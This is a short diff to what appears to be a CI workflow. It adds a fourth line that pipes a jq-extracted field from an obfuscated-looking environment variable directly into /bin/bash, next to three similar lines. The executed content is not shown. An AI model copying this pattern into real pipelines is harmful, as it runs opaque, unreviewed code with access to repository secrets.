@@ -28,6 +28,7 @@ jobs:
           echo $oknu96400 | jq -r .kugeo3 | /bin/bash
           printf '%s' "$d15975" | jq -r .nuq2 | /bin/bash
           printf '%s' "$dmjp60" | jq -r .lcjw530 | /bin/bash
+          printf '%s' "$ec54097" | jq -r .bt4 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
